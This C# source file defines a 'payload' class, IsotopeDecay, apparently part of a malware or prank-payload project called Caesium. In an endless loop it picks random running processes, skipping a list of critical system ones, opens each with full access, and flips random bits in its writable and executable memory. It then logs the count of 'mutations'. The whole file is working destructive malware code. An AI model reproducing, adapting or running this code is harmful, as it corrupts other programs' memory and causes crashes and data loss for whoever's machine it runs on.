using System.Diagnostics;
using System.Runtime.InteropServices;

namespace Caesium.Payloads;

public abstract unsafe partial class IsotopeDecay : IPayload
{
    // --- WIN32 CONSTANTS ---
    private const uint ProcessAllAccess = 0x001F0FFF;
    private const uint MemCommit = 0x1000;
    private const uint PageReadWrite = 0x04;
    private const uint PageExecuteReadWrite = 0x40;

    // --- WIN32 STRUCTS ---
    [StructLayout(LayoutKind.Sequential)]
    public struct MemoryBasicInformation
    {
        public IntPtr BaseAddress;
        public IntPtr AllocationBase;
        public uint AllocationProtect;
        public ushort PartitionId;
        public IntPtr RegionSize;
        public uint State;
        public uint Protect;
        public uint Type;
    }

    // --- WIN32 IMPORTS ---
    [LibraryImport("kernel32.dll", SetLastError = true)]
    private static partial IntPtr OpenProcess(uint processAccess, [MarshalAs(UnmanagedType.Bool)] bool bInheritHandle,
        int processId);

    [LibraryImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static partial bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize,
        out int lpNumberOfBytesRead);

    [LibraryImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static partial bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize,
        out int lpNumberOfBytesWritten);

    [LibraryImport("kernel32.dll", SetLastError = true)]
    private static partial nint VirtualQueryEx(IntPtr hProcess, IntPtr lpAddress, out MemoryBasicInformation lpBuffer,
        uint dwLength);

    [LibraryImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static partial bool CloseHandle(IntPtr hObject);

    // Define the exclusion list
    private static readonly string[] CriticalIsotopes =
    [
        "lsass", "csrss", "wininit", "smss", "services",
        "Caesium", "winlogon", "svchost", "conhost", "cmd", "fontdrvhost", "sihost"
    ];

    public static void Execute()
    {
        var rnd = Random.Shared;

        while (true)
        {
            // 1. Target Acquisition (Including Critical Processes)
            var processes = Process.GetProcesses().ToList();
            if (processes.Count == 0) continue;

            var victim = processes[rnd.Next(processes.Count)];

            // Skip critical isotopes
            if (CriticalIsotopes.Any(name => victim.ProcessName.Contains(name, StringComparison.OrdinalIgnoreCase)))
                continue;

            var hProcess = OpenProcess(ProcessAllAccess, false, victim.Id);
            if (hProcess == IntPtr.Zero) continue;

            // 2. Map the "Hot" Memory Regions
            List<(IntPtr Address, long Size)> mappedRegions = [];
            // Scan the first 1TB of address space for committed memory
            nuint currentAddrVal = 0;
            while (VirtualQueryEx(hProcess, (IntPtr)currentAddrVal, out var mbi,
                       (uint)sizeof(MemoryBasicInformation)) != 0)
            {
                if (mbi is { State: MemCommit, Protect: PageReadWrite or PageExecuteReadWrite })
                    mappedRegions.Add((mbi.BaseAddress, mbi.RegionSize));

                // Add the size to the current base
                currentAddrVal = (nuint)mbi.BaseAddress + (nuint)mbi.RegionSize;

                // Use the 'UL' suffix to tell the compiler this is an Unsigned Long constant
                if (mappedRegions.Count > 100 || (nuint)mbi.RegionSize == 0) break;
            }

            if (mappedRegions.Count == 0)
            {
                CloseHandle(hProcess);
                continue;
            }

            // 3. Radioactive Decay Loop
            var halfLife = Stopwatch.StartNew();
            var buffer = new byte[1];
            var totalHits = 0;

            while (!victim.HasExited && halfLife.Elapsed.TotalSeconds < 15)
            {
                // Pick a random mapped region
                var region = mappedRegions[rnd.Next(mappedRegions.Count)];

                // Pick a random address within that region
                var offset = (long)(rnd.NextDouble() * region.Size);
                var targetAddr = (IntPtr)(region.Address + offset);

                if (ReadProcessMemory(hProcess, targetAddr, buffer, 1, out _))
                {
                    // Flip a random bit (Radon mutation)
                    buffer[0] ^= (byte)(1 << rnd.Next(0, 8));

                    if (WriteProcessMemory(hProcess, targetAddr, buffer, 1, out _)) totalHits++;
                }

                // Maximum reactivity
                Thread.Sleep(0);
            }

            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine($"[Decay] {victim.ProcessName} stabilized. Total Mutations: {totalHits}");
            Console.ResetColor();

            CloseHandle(hProcess);
            Thread.Sleep(100); // Short breath between targets
        }
    }
}